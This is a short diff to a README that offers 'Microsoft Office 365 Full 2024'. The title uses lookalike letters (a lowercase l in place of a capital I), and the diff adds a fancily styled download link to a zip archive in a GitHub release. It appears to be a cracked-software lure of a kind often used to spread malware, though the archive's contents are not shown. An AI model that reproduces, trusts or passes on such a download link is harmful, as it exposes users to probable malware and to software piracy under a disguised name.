@@ -1,6 +1,6 @@
 # MlCROSOFT-OFFlCE-365-Full-2024
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/Infamous0192/MlCROSOFT-OFFlCE-365-Full-2024/releases/download/microsoft-office/microsoft.office.365.zip)
 
 •
 Office 365 is a complex ecosystem in which there are many additions and changes. 
